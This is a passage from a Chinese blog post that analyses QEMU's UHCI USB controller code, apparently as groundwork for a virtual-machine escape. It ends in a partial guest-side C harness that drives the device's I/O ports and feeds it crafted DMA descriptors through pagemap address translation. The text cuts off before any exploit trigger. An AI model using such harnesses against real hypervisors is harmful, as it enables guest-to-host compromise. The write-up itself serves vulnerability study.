<p>其中<code>s-&gt;frame_timer = timer_new_ns(QEMU_CLOCK_VIRTUAL, uhci_frame_timer, s);</code>注册了一个定时任务，<code>memory_region_init_io(&amp;s-&gt;io_bar, OBJECT(s), &amp;uhci_ioport_ops, s,&quot;uhci&quot;, 0x20);</code>注册了一个IO端口，其大小为0x20字节，通过<code>pci_register_bar(&amp;s-&gt;dev, 4, PCI_BASE_ADDRESS_SPACE_IO, &amp;s-&gt;io_bar);</code>注册设备BAR，其下标为4。<br>IO操作注册表<code>uhci_ioport_ops</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">static const MemoryRegionOps uhci_ioport_ops = &#123;</span><br><span class="line">    .read  = uhci_port_read,</span><br><span class="line">    .write = uhci_port_write,</span><br><span class="line">    .valid.min_access_size = 1,</span><br><span class="line">    .valid.max_access_size = 4,</span><br><span class="line">    .impl.min_access_size = 2,</span><br><span class="line">    .impl.max_access_size = 2,</span><br><span class="line">    .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>有两个操作，read和write，分别可以使用out和in指令来进行触发。<br>其中<code>uhci_port_read</code>读取当前设备的一些状态，<code>addr</code>的值是使用IO时传入的地址相对于该设备<code>基址IO</code>的偏移</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">static uint64_t uhci_port_read(void *opaque, hwaddr addr, unsigned size)</span><br><span class="line">&#123;</span><br><span class="line">    UHCIState *s = opaque;</span><br><span class="line">    uint32_t val;</span><br><span class="line"></span><br><span class="line">    switch(addr) &#123;</span><br><span class="line">    case 0x00:</span><br><span class="line">        val = s-&gt;cmd;</span><br><span class="line">        break;</span><br><span class="line">    case 0x02:</span><br><span class="line">        val = s-&gt;status;</span><br><span class="line">        break;</span><br><span class="line">    case 0x04:</span><br><span class="line">        val = s-&gt;intr;</span><br><span class="line">        break;</span><br><span class="line">    case 0x06:</span><br><span class="line">        val = s-&gt;frnum;</span><br><span class="line">        break;</span><br><span class="line">    case 0x08:</span><br><span class="line">        val = s-&gt;fl_base_addr &amp; 0xffff;</span><br><span class="line">        break;</span><br><span class="line">    case 0x0a:</span><br><span class="line">        val = (s-&gt;fl_base_addr &gt;&gt; 16) &amp; 0xffff;</span><br><span class="line">        break;</span><br><span class="line">    case 0x0c:</span><br><span class="line">        val = s-&gt;sof_timing;</span><br><span class="line">        break;</span><br><span class="line">    case 0x10 ... 0x1f:</span><br><span class="line">        &#123;</span><br><span class="line">            UHCIPort *port;</span><br><span class="line">            int n;</span><br><span class="line">            n = (addr &gt;&gt; 1) &amp; 7;</span><br><span class="line">            if (n &gt;= NB_PORTS)</span><br><span class="line">                goto read_default;</span><br><span class="line">            port = &amp;s-&gt;ports[n];</span><br><span class="line">            val = port-&gt;ctrl;</span><br><span class="line">        &#125;</span><br><span class="line">        break;</span><br><span class="line">    default:</span><br><span class="line">    read_default:</span><br><span class="line">        val = 0xff7f; /* disabled port */</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    trace_usb_uhci_mmio_readw(addr, val);</span><br><span class="line"></span><br><span class="line">    return val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同理<code>uhci_port_write</code>向设备写入一些数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">static void uhci_port_write(void *opaque, hwaddr addr,</span><br><span class="line">                            uint64_t val, unsigned size)</span><br><span class="line">&#123;</span><br><span class="line">    UHCIState *s = opaque;</span><br><span class="line"></span><br><span class="line">    trace_usb_uhci_mmio_writew(addr, val);</span><br><span class="line"></span><br><span class="line">    switch(addr) &#123;</span><br><span class="line">    case 0x00:</span><br><span class="line">        if ((val &amp; UHCI_CMD_RS) &amp;&amp; !(s-&gt;cmd &amp; UHCI_CMD_RS)) &#123;</span><br><span class="line">            /* start frame processing */</span><br><span class="line">            trace_usb_uhci_schedule_start();</span><br><span class="line">            s-&gt;expire_time = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL) +</span><br><span class="line">                (NANOSECONDS_PER_SECOND / FRAME_TIMER_FREQ);</span><br><span class="line">            timer_mod(s-&gt;frame_timer, s-&gt;expire_time);</span><br><span class="line">            s-&gt;status &amp;= ~UHCI_STS_HCHALTED;</span><br><span class="line">        &#125; else if (!(val &amp; UHCI_CMD_RS)) &#123;</span><br><span class="line">            s-&gt;status |= UHCI_STS_HCHALTED;</span><br><span class="line">        &#125;</span><br><span class="line">        if (val &amp; UHCI_CMD_GRESET) &#123;</span><br><span class="line">            UHCIPort *port;</span><br><span class="line">            int i;</span><br><span class="line"></span><br><span class="line">            /* send reset on the USB bus */</span><br><span class="line">            for(i = 0; i &lt; NB_PORTS; i++) &#123;</span><br><span class="line">                port = &amp;s-&gt;ports[i];</span><br><span class="line">                usb_device_reset(port-&gt;port.dev);</span><br><span class="line">            &#125;</span><br><span class="line">            uhci_reset(DEVICE(s));</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        if (val &amp; UHCI_CMD_HCRESET) &#123;</span><br><span class="line">            uhci_reset(DEVICE(s));</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        s-&gt;cmd = val;</span><br><span class="line">        if (val &amp; UHCI_CMD_EGSM) &#123;</span><br><span class="line">            if ((s-&gt;ports[0].ctrl &amp; UHCI_PORT_RD) ||</span><br><span class="line">                (s-&gt;ports[1].ctrl &amp; UHCI_PORT_RD)) &#123;</span><br><span class="line">                uhci_resume(s);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        break;</span><br><span class="line">    case 0x02:</span><br><span class="line">        s-&gt;status &amp;= ~val;</span><br><span class="line">        /* XXX: the chip spec is not coherent, so we add a hidden</span><br><span class="line">           register to distinguish between IOC and SPD */</span><br><span class="line">        if (val &amp; UHCI_STS_USBINT)</span><br><span class="line">            s-&gt;status2 = 0;</span><br><span class="line">        uhci_update_irq(s);</span><br><span class="line">        break;</span><br><span class="line">    case 0x04:</span><br><span class="line">        s-&gt;intr = val;</span><br><span class="line">        uhci_update_irq(s);</span><br><span class="line">        break;</span><br><span class="line">    case 0x06:</span><br><span class="line">        if (s-&gt;status &amp; UHCI_STS_HCHALTED)</span><br><span class="line">            s-&gt;frnum = val &amp; 0x7ff;</span><br><span class="line">        break;</span><br><span class="line">    case 0x08:</span><br><span class="line">        s-&gt;fl_base_addr &amp;= 0xffff0000;</span><br><span class="line">        s-&gt;fl_base_addr |= val &amp; ~0xfff;</span><br><span class="line">        break;</span><br><span class="line">    case 0x0a:</span><br><span class="line">        s-&gt;fl_base_addr &amp;= 0x0000ffff;</span><br><span class="line">        s-&gt;fl_base_addr |= (val &lt;&lt; 16);</span><br><span class="line">        break;</span><br><span class="line">    case 0x0c:</span><br><span class="line">        s-&gt;sof_timing = val &amp; 0xff;</span><br><span class="line">        break;</span><br><span class="line">    case 0x10 ... 0x1f:</span><br><span class="line">        &#123;</span><br><span class="line">            UHCIPort *port;</span><br><span class="line">            USBDevice *dev;</span><br><span class="line">            int n;</span><br><span class="line"></span><br><span class="line">            n = (addr &gt;&gt; 1) &amp; 7;</span><br><span class="line">            if (n &gt;= NB_PORTS)</span><br><span class="line">                return;</span><br><span class="line">            port = &amp;s-&gt;ports[n];</span><br><span class="line">            dev = port-&gt;port.dev;</span><br><span class="line">            if (dev &amp;&amp; dev-&gt;attached) &#123;</span><br><span class="line">                /* port reset */</span><br><span class="line">                if ( (val &amp; UHCI_PORT_RESET) &amp;&amp;</span><br><span class="line">                     !(port-&gt;ctrl &amp; UHCI_PORT_RESET) ) &#123;</span><br><span class="line">                    usb_device_reset(dev);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            port-&gt;ctrl &amp;= UHCI_PORT_READ_ONLY;</span><br><span class="line">            /* enabled may only be set if a device is connected */</span><br><span class="line">            if (!(port-&gt;ctrl &amp; UHCI_PORT_CCS)) &#123;</span><br><span class="line">                val &amp;= ~UHCI_PORT_EN;</span><br><span class="line">            &#125;</span><br><span class="line">            port-&gt;ctrl |= (val &amp; ~UHCI_PORT_READ_ONLY);</span><br><span class="line">            /* some bits are reset when a &#x27;1&#x27; is written to them */</span><br><span class="line">            port-&gt;ctrl &amp;= ~(val &amp; UHCI_PORT_WRITE_CLEAR);</span><br><span class="line">        &#125;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中看到<code>case 0x00</code>时如果条件满足，会将计时器时间设为时间到，这样会触发之前注册的定时任务函数<code>uhci_frame_timer</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">static void uhci_frame_timer(void *opaque)</span><br><span class="line">&#123;</span><br><span class="line">    UHCIState *s = opaque;</span><br><span class="line">........</span><br><span class="line"></span><br><span class="line">    for (i = 0; i &lt; frames; i++) &#123;</span><br><span class="line">        s-&gt;frame_bytes = 0;</span><br><span class="line">        trace_usb_uhci_frame_start(s-&gt;frnum);</span><br><span class="line">        uhci_async_validate_begin(s);</span><br><span class="line">        uhci_process_frame(s);</span><br><span class="line">        uhci_async_validate_end(s);</span><br><span class="line">        /* The spec says frnum is the frame currently being processed, and</span><br><span class="line">         * the guest must look at frnum - 1 on interrupt, so inc frnum now */</span><br><span class="line">        s-&gt;frnum = (s-&gt;frnum + 1) &amp; 0x7ff;</span><br><span class="line">        s-&gt;expire_time += frame_t;</span><br><span class="line">    &#125;</span><br><span class="line">.........</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在该函数中，会调用<code>uhci_process_frame</code>函数处理当前累计需要传送的帧的数据，<code>uhci_process_frame</code>函数如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">static void uhci_process_frame(UHCIState *s)</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t frame_addr, link, old_td_ctrl, val, int_mask;</span><br><span class="line">    uint32_t curr_qh, td_count = 0;</span><br><span class="line">    int cnt, ret;</span><br><span class="line">    UHCI_TD td;</span><br><span class="line">    UHCI_QH qh;</span><br><span class="line">    QhDb qhdb;</span><br><span class="line"></span><br><span class="line">    frame_addr = s-&gt;fl_base_addr + ((s-&gt;frnum &amp; 0x3ff) &lt;&lt; 2);</span><br><span class="line"></span><br><span class="line">    pci_dma_read(&amp;s-&gt;dev, frame_addr, &amp;link, 4);</span><br><span class="line">    le32_to_cpus(&amp;link);</span><br><span class="line"></span><br><span class="line">.........</span><br><span class="line">        /* TD */</span><br><span class="line">        uhci_read_td(s, &amp;td, link);</span><br><span class="line">        trace_usb_uhci_td_load(curr_qh &amp; ~0xf, link &amp; ~0xf, td.ctrl, td.token);</span><br><span class="line"></span><br><span class="line">        old_td_ctrl = td.ctrl;</span><br><span class="line">        ret = uhci_handle_td(s, NULL, curr_qh, &amp;td, link, &amp;int_mask);</span><br><span class="line">..........</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里从物理地址处先读入一个地址link，然后将link当作物理地址，从中读取一个<code>td</code>结构体</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">typedef struct UHCI_TD &#123;</span><br><span class="line">    uint32_t link;</span><br><span class="line">    uint32_t ctrl; /* see TD_CTRL_xxx */</span><br><span class="line">    uint32_t token;</span><br><span class="line">    uint32_t buffer;</span><br><span class="line">&#125; UHCI_TD;</span><br><span class="line"></span><br><span class="line">static void uhci_read_td(UHCIState *s, UHCI_TD *td, uint32_t link)</span><br><span class="line">&#123;</span><br><span class="line">    pci_dma_read(&amp;s-&gt;dev, link &amp; ~0xf, td, sizeof(*td));</span><br><span class="line">    le32_to_cpus(&amp;td-&gt;link);</span><br><span class="line">    le32_to_cpus(&amp;td-&gt;ctrl);</span><br><span class="line">    le32_to_cpus(&amp;td-&gt;token);</span><br><span class="line">    le32_to_cpus(&amp;td-&gt;buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后td结构体会被传入<code>uhci_handle_td</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">static int uhci_handle_td(UHCIState *s, UHCIQueue *q, uint32_t qh_addr,</span><br><span class="line">                          UHCI_TD *td, uint32_t td_addr, uint32_t *int_mask)</span><br><span class="line">&#123;</span><br><span class="line">    int ret, max_len;</span><br><span class="line">    bool spd;</span><br><span class="line">    bool queuing = (q != NULL);</span><br><span class="line">    uint8_t pid = td-&gt;token &amp; 0xff;</span><br><span class="line">    UHCIAsync *async;</span><br><span class="line"></span><br><span class="line">..........</span><br><span class="line">    /* Is active ? */</span><br><span class="line">    if (!(td-&gt;ctrl &amp; TD_CTRL_ACTIVE)) &#123;</span><br><span class="line">        if (async) &#123;</span><br><span class="line">            /* Guest marked a pending td non-active, cancel the queue */</span><br><span class="line">            uhci_queue_free(async-&gt;queue, &quot;pending td non-active&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        /*</span><br><span class="line">         * ehci11d spec page 22: &quot;Even if the Active bit in the TD is already</span><br><span class="line">         * cleared when the TD is fetched ... an IOC interrupt is generated&quot;</span><br><span class="line">         */</span><br><span class="line">        if (td-&gt;ctrl &amp; TD_CTRL_IOC) &#123;</span><br><span class="line">                *int_mask |= 0x01;</span><br><span class="line">        &#125;</span><br><span class="line">        return TD_RESULT_NEXT_QH;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    switch (pid) &#123;</span><br><span class="line">    case USB_TOKEN_OUT:</span><br><span class="line">    case USB_TOKEN_SETUP:</span><br><span class="line">    case USB_TOKEN_IN:</span><br><span class="line">        break;</span><br><span class="line">    default:</span><br><span class="line">        /* invalid pid : frame interrupted */</span><br><span class="line">        s-&gt;status |= UHCI_STS_HCPERR;</span><br><span class="line">        s-&gt;cmd &amp;= ~UHCI_CMD_RS;</span><br><span class="line">        uhci_update_irq(s);</span><br><span class="line">        return TD_RESULT_STOP_FRAME;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">.............</span><br><span class="line">    switch(pid) &#123;</span><br><span class="line">    case USB_TOKEN_OUT:</span><br><span class="line">    case USB_TOKEN_SETUP:</span><br><span class="line">        pci_dma_read(&amp;s-&gt;dev, td-&gt;buffer, async-&gt;buf, max_len);</span><br><span class="line">        usb_handle_packet(q-&gt;ep-&gt;dev, &amp;async-&gt;packet);</span><br><span class="line">        if (async-&gt;packet.status == USB_RET_SUCCESS) &#123;</span><br><span class="line">            async-&gt;packet.actual_length = max_len;</span><br><span class="line">        &#125;</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">    case USB_TOKEN_IN:</span><br><span class="line">        usb_handle_packet(q-&gt;ep-&gt;dev, &amp;async-&gt;packet);</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">    default:</span><br><span class="line">        abort(); /* Never to execute */</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (async-&gt;packet.status == USB_RET_ASYNC) &#123;</span><br><span class="line">        uhci_async_link(async);</span><br><span class="line">        if (!queuing) &#123;</span><br><span class="line">            uhci_queue_fill(q, td);</span><br><span class="line">        &#125;</span><br><span class="line">        return TD_RESULT_ASYNC_START;</span><br><span class="line">    &#125;</span><br><span class="line">.......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>uhci_handle_td会根据传入的td结构体里对应的<code>td-&gt;token</code>，做出相应的动作，如果是<code>USB_TOKEN_IN</code>或者<code>USB_TOKEN_OUT</code>、<code>USB_TOKEN_SETUP</code>的话，会调用<code>usb_handle_packet</code>函数,然后<code>usb_handle_packet</code>会调用<code>usb_process_one</code>函数，最终完成对USB设备的数据读取。从整个流程下来看，要进入最终的数据交换函数，我们构造如下的代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#include &lt;sys/io.h&gt;</span><br><span class="line"></span><br><span class="line">#define PFN_MASK ((((size_t)1)&lt;&lt;54)-1)</span><br><span class="line">#define UHCI_BASE 0xc040</span><br><span class="line"></span><br><span class="line">#define UHCI_CMD_HCRESET (1 &lt;&lt; 1)</span><br><span class="line">#define UHCI_CMD_RS (1 &lt;&lt; 0)</span><br><span class="line"></span><br><span class="line">#define UHCI_PORT_RESET (1 &lt;&lt; 9)</span><br><span class="line">#define UHCI_PORT_EN    (1 &lt;&lt; 2)    //enable</span><br><span class="line">#define UHCI_PORT_CCS   (1 &lt;&lt; 0)</span><br><span class="line"></span><br><span class="line">#define TD_CTRL_ACTIVE  (1 &lt;&lt; 23)</span><br><span class="line"></span><br><span class="line">typedef struct UHCI_TD &#123;</span><br><span class="line">    uint32_t link;</span><br><span class="line">    uint32_t ctrl; /* see TD_CTRL_xxx */</span><br><span class="line">    uint32_t token;</span><br><span class="line">    uint32_t buffer;</span><br><span class="line">&#125; UHCI_TD;</span><br><span class="line"></span><br><span class="line">struct UHCI_TD * td;</span><br><span class="line">uint32_t *td_phy_addr_in_any_frame;</span><br><span class="line"></span><br><span class="line">char *dmabuf;</span><br><span class="line">unsigned char *data_buf;</span><br><span class="line">char *setup_buf;</span><br><span class="line"></span><br><span class="line">void die(char *msg) &#123;</span><br><span class="line">   perror(msg);</span><br><span class="line">   exit(-1);</span><br><span class="line">&#125;</span><br><span class="line">/*向设备写入数据*/</span><br><span class="line">void pmio_write(uint32_t addr,uint32_t val) &#123;</span><br><span class="line">   outl(val,UHCI_BASE + addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*从UHCI读取数据*/</span><br><span class="line">uint32_t pmio_read(uint32_t addr) &#123;</span><br><span class="line">   return (uint32_t)inl(UHCI_BASE + addr);</span><br><span class="line">&#125;</span><br><span class="line">//虚拟地址转换为物理地址</span><br><span class="line">size_t get_phys_addr(void *vir_addr) &#123;</span><br><span class="line">   int fd = open(&quot;/proc/self/pagemap&quot;, O_RDONLY); /*打开页映射表*/</span><br><span class="line">   if (fd == -1) &#123;</span><br><span class="line">      die(&quot;open pagemap error&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">   size_t vir = (size_t)vir_addr;</span><br><span class="line">   // /0x1000获得是第n页的这个n，由于一个记录数据8字节，因此*8，算的的就是该页在文件里的记录的偏移</span><br><span class="line">   size_t offset = vir / 0x1000 * 8;</span><br><span class="line">   if (lseek(fd,offset,SEEK_SET) == -1) &#123;</span><br><span class="line">      die(&quot;lseek pagemap error&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">   size_t addr;</span><br><span class="line">   if (read(fd,&amp;addr,8) != 8) &#123;</span><br><span class="line">      die(&quot;read pagemap error&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">   addr = (addr &amp; PFN_MASK) * 0x1000 + vir % 0x1000;</span><br><span class="line">   return addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void init() &#123;</span><br><span class="line">    /* 映射一块dmabufs 也就是dma模式的读写，读写的数据都在这块内存上*/</span><br><span class="line">    dmabuf = mmap(0, 0x6000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, -1, 0);</span><br><span class="line">    if (dmabuf == MAP_FAILED)</span><br><span class="line">        die(&quot;mmap&quot;);</span><br><span class="line">    /* 上锁，防止被调度 */</span><br><span class="line">    mlock(dmabuf, 0x6000);</span><br><span class="line"></span><br><span class="line">    td = (UHCI_TD *)dmabuf;</span><br><span class="line">    td_phy_addr_in_any_frame = (uint32_t *)(dmabuf + 0x100);</span><br><span class="line"></span><br><span class="line">    setup_buf = dmabuf + 0x300;</span><br><span class="line">    data_buf = dmabuf + 0x1000;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void set_UHCIState() &#123;</span><br><span class="line">    //清空UHCI之前的状态，这样我们在下一次就可以触发定时任务了</span><br><span class="line">    pmio_write(0,UHCI_CMD_HCRESET);</span><br><span class="line">    //初始化USB端口</span><br><span class="line">    for(int i=0x10;i &lt;= 0x1f;i++)</span><br><span class="line">        pmio_write(i, UHCI_PORT_CCS | UHCI_PORT_RESET | UHCI_PORT_EN);</span><br><span class="line">    uint32_t td_phy_addr = get_phys_addr(td);</span><br><span class="line">    *td_phy_addr_in_any_frame = td_phy_addr;</span><br><span class="line">    //pmio_write(6, 0); //设置s-&gt;frnum为0</span><br><span class="line">    pmio_write(8, td_phy_addr); //设置s-&gt;fl_base_addr为td结构体的物理地址</span><br><span class="line">    pmio_write(0, UHCI_CMD_RS);</span><br><span class="line">    sleep(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">   init();</span><br><span class="line">   //申请IO权限</span><br><span class="line">   iopl(3);</span><br><span class="line">   